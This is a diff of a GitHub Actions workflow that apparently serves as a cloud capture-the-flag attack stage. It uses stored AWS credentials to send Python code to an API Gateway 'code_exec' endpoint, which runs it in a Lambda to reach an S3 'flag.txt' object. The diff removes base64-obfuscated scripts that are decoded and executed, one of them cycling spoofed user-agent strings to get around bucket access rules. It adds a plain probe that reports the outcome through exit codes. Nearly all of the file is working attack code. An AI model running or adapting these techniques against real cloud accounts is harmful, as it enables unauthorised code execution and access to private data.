@@ -1,38 +1,107 @@
 name: Stage2
+
 on:
   push:
     branches:
       - corgi
+
 permissions:
   contents: read
 
 jobs:
   recon:
     runs-on: ubuntu-latest
+
     env:
       AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
       AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
       AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
       AWS_DEFAULT_REGION: us-east-1
+
     steps:
-      - name: Who am I
-        run: aws sts get-caller-identity
-
-      - name: Fetch docs.html
-        run: curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
-        
-      - name: Try UserAgents from Lambda
+      - name: Test Chrome User-Agent
         run: |
-          pip install requests requests-aws4auth --quiet
-          
-      - name: Read error + try more UAs
-        run: |
-          pip install requests requests-aws4auth --quiet
+          pip install boto3 requests requests-aws4auth --quiet
 
-          echo "=== Reading unsigned boto3 error ==="
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzLCByZQpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aApBUEkgPSAnaHR0cHM6Ly9sOHNzeWF6NjlmLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2Rldi9jb2RlX2V4ZWMnCmNyZWRzID0gYm90bzMuU2Vzc2lvbigpLmdldF9jcmVkZW50aWFscygpLmdldF9mcm96ZW5fY3JlZGVudGlhbHMoKQphdXRoID0gQVdTNEF1dGgoY3JlZHMuYWNjZXNzX2tleSwgY3JlZHMuc2VjcmV0X2tleSwgJ3VzLWVhc3QtMScsICdleGVjdXRlLWFwaScsIHNlc3Npb25fdG9rZW49Y3JlZHMudG9rZW4pCmRlZiBydW4oY29kZSk6CiAgICByID0gcmVxdWVzdHMucG9zdChBUEksIGpzb249eydjb2RlJzogYmFzZTY0LmI2NGVuY29kZShjb2RlLmVuY29kZSgpKS5kZWNvZGUoKX0sIGF1dGg9YXV0aCkKICAgIHJldHVybiByLmpzb24oKQpkZWYgZWMocmVzcCk6CiAgICBtc2cgPSByZXNwLmdldCgnZXJyb3JNZXNzYWdlJywgJycpCiAgICBpbXBvcnQgcmUgYXMgcmUyCiAgICBtID0gcmUyLnNlYXJjaChyJ2V4aXQgc3RhdHVzIChcZCspJywgbXNnKQogICAgcmV0dXJuIGludChtLmdyb3VwKDEpKSBpZiBtIGVsc2UgTm9uZQpyID0gcnVuKCJpbXBvcnQgYm90bzNcbmZyb20gYm90b2NvcmUgaW1wb3J0IFVOU0lHTkVEXG5mcm9tIGJvdG9jb3JlLmNsaWVudCBpbXBvcnQgQ29uZmlnXG5mcm9tIGJvdG9jb3JlLmV4Y2VwdGlvbnMgaW1wb3J0IENsaWVudEVycm9yXG50cnk6XG4gICAgczMgPSBib3RvMy5jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScsXG4gICAgICAgICAgICAgICAgICAgICAgZW5kcG9pbnRfdXJsPSdodHRwczovL3MzLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tJyxcbiAgICAgICAgICAgICAgICAgICAgICBjb25maWc9Q29uZmlnKHNpZ25hdHVyZV92ZXJzaW9uPVVOU0lHTkVEKSlcbiAgICByID0gczMuZ2V0X29iamVjdChCdWNrZXQ9J3VzZXJhZDg4ZTJiMTY4YWEzODdlJywgS2V5PSdmbGFnLnR4dCcpXG5leGNlcHQgQ2xpZW50RXJyb3IgYXMgZTpcbiAgICBtc2cgPSBzdHIoZSlcbiAgICByYWlzZSBTeXN0ZW1FeGl0KGxlbihtc2cpKVxuZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxuICAgIG1zZyA9IHN0cihlKVxuICAgIHJhaXNlIFN5c3RlbUV4aXQobGVuKG1zZykgKyAyMDApIikKcHJpbnQoZidleGl0OiB7ZWMocil9IHJhdzoge3J9JykK'
-          printf '%s' "$B64" | base64 -d > /tmp/err.py && python3 /tmp/err.py
+          cat > /tmp/probe.py <<'PY'
+          import base64
+          import re
+          import requests
+          import boto3
+          from requests_aws4auth import AWS4Auth
 
-          echo "=== Trying more UAs ==="
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzLCByZQpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aApBUEkgPSAnaHR0cHM6Ly9sOHNzeWF6NjlmLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2Rldi9jb2RlX2V4ZWMnCmNyZWRzID0gYm90bzMuU2Vzc2lvbigpLmdldF9jcmVkZW50aWFscygpLmdldF9mcm96ZW5fY3JlZGVudGlhbHMoKQphdXRoID0gQVdTNEF1dGgoY3JlZHMuYWNjZXNzX2tleSwgY3JlZHMuc2VjcmV0X2tleSwgJ3VzLWVhc3QtMScsICdleGVjdXRlLWFwaScsIHNlc3Npb25fdG9rZW49Y3JlZHMudG9rZW4pCmRlZiBydW4oY29kZSk6CiAgICByID0gcmVxdWVzdHMucG9zdChBUEksIGpzb249eydjb2RlJzogYmFzZTY0LmI2NGVuY29kZShjb2RlLmVuY29kZSgpKS5kZWNvZGUoKX0sIGF1dGg9YXV0aCkKICAgIHJldHVybiByLmpzb24oKQpkZWYgZWMocmVzcCk6CiAgICBtc2cgPSByZXNwLmdldCgnZXJyb3JNZXNzYWdlJywgJycpCiAgICBpbXBvcnQgcmUgYXMgcmUyCiAgICBtID0gcmUyLnNlYXJjaChyJ2V4aXQgc3RhdHVzIChcZCspJywgbXNnKQogICAgcmV0dXJuIGludChtLmdyb3VwKDEpKSBpZiBtIGVsc2UgTm9uZQpyID0gcnVuKCJpbXBvcnQgYm90bzMsIGJvdG9jb3JlLnNlc3Npb25cbmZyb20gYm90b2NvcmUgaW1wb3J0IFVOU0lHTkVEXG5mcm9tIGJvdG9jb3JlLmNsaWVudCBpbXBvcnQgQ29uZmlnXG5mcm9tIGJvdG9jb3JlLmV4Y2VwdGlvbnMgaW1wb3J0IENsaWVudEVycm9yXG5cbmFnZW50cyA9IFtcbiAgICAnZmFpdGgnLCAnSGF2ZVNvbWVGYWl0aCcsICdoYXZlLXNvbWUtZmFpdGgnLFxuICAgICdzdGFnZTInLCAnQ2xvdWRFc2NhcGUnLCAnY2xvdWQtZXNjYXBlJyxcbiAgICAnUHl0aG9uLXVybGxpYi8zLjEzJywgJ1B5dGhvbi11cmxsaWIvMy4xMy4xNCcsXG4gICAgJ3B5dGhvbi1yZXF1ZXN0cy8yLjMxLjAnLFxuICAgICdjdXJsLzcuODguMScsICdjdXJsLzguNi4wJywgJ2N1cmwnLFxuICAgICdNb3ppbGxhLzUuMCcsICdXZ2V0LzEuMjEnLFxuICAgICdpbGF5emFuZGFuaScsICdqdW5pb3InLCAndGVzdC11c2VyJyxcbiAgICAnc2VjcmV0LWFnZW50JywgJ2Nsb3VkLWFnZW50JywgJ2FnZW50Jyxcbl1cblxuZm9yIGksIHVhIGluIGVudW1lcmF0ZShhZ2VudHMpOlxuICAgIHRyeTpcbiAgICAgICAgc2VzcyA9IGJvdG9jb3JlLnNlc3Npb24uZ2V0X3Nlc3Npb24oKVxuICAgICAgICBzZXNzLl9zZXNzaW9uX2luc3RhbmNlX3ZhcnNbJ3VzZXJfYWdlbnRfbmFtZSddID0gdWFcbiAgICAgICAgc2Vzcy5fc2Vzc2lvbl9pbnN0YW5jZV92YXJzWyd1c2VyX2FnZW50X3ZlcnNpb24nXSA9ICcnXG4gICAgICAgIHNlc3MuX3Nlc3Npb25faW5zdGFuY2VfdmFyc1sndXNlcl9hZ2VudF9leHRyYSddID0gJydcbiAgICAgICAgczMgPSBzZXNzLmNyZWF0ZV9jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmRwb2ludF91cmw9J2h0dHBzOi8vczMudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdzX2FjY2Vzc19rZXlfaWQ9JycsIGF3c19zZWNyZXRfYWNjZXNzX2tleT0nJylcbiAgICAgICAgciA9IHMzLmdldF9vYmplY3QoQnVja2V0PSd1c2VyYWQ4OGUyYjE2OGFhMzg3ZScsIEtleT0nZmxhZy50eHQnKVxuICAgICAgICBkYXRhID0gclsnQm9keSddLnJlYWQoKVxuICAgICAgICByYWlzZSBTeXN0ZW1FeGl0KGkgKyAxMDApXG4gICAgZXhjZXB0IFN5c3RlbUV4aXQ6XG4gICAgICAgIHJhaXNlXG4gICAgZXhjZXB0IEV4Y2VwdGlvbjpcbiAgICAgICAgcGFzc1xuXG5yYWlzZSBTeXN0ZW1FeGl0KDApIikKcHJpbnQoZidleGl0OiB7ZWMocil9IHJhdzoge3J9JykK'
-          printf '%s' "$B64" | base64 -d > /tmp/uas.py && python3 /tmp/uas.py
+          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
+
+          credentials = boto3.Session().get_credentials().get_frozen_credentials()
+
+          auth = AWS4Auth(
+              credentials.access_key,
+              credentials.secret_key,
+              "us-east-1",
+              "execute-api",
+              session_token=credentials.token,
+          )
+
+          lambda_code = r'''
+          import boto3
+          from botocore.config import Config
+          from botocore.exceptions import ClientError
+
+          try:
+              s3 = boto3.client(
+                  "s3",
+                  region_name="us-east-1",
+                  endpoint_url="https://s3.us-east-1.amazonaws.com",
+                  config=Config(
+                      user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
+                  ),
+              )
+
+              s3.head_object(
+                  Bucket="userad88e2b168aa387e",
+                  Key="flag.txt",
+              )
+
+              raise SystemExit(7)
+
+          except ClientError as error:
+              code = error.response.get("Error", {}).get("Code", "")
+
+              if code in ["AccessDenied", "403"]:
+                  raise SystemExit(10)
+
+              if code in ["NoSuchKey", "404", "NotFound"]:
+                  raise SystemExit(12)
+
+              raise SystemExit(13)
+
+          except Exception:
+              raise SystemExit(14)
+          '''
+
+          encoded_code = base64.b64encode(
+              lambda_code.encode()
+          ).decode()
+
+          response = requests.post(
+              API,
+              json={"code": encoded_code},
+              auth=auth,
+              timeout=30,
+          )
+
+          print("HTTP:", response.status_code)
+          print("BODY:", response.text)
+
+          match = re.search(
+              r"exit status (\d+)",
+              response.text,
+          )
+
+          print(
+              "UA_TEST_STATUS:",
+              match.group(1) if match else "NO_EXIT_CODE",
+          )
+          PY
+
+          python3 /tmp/probe.py
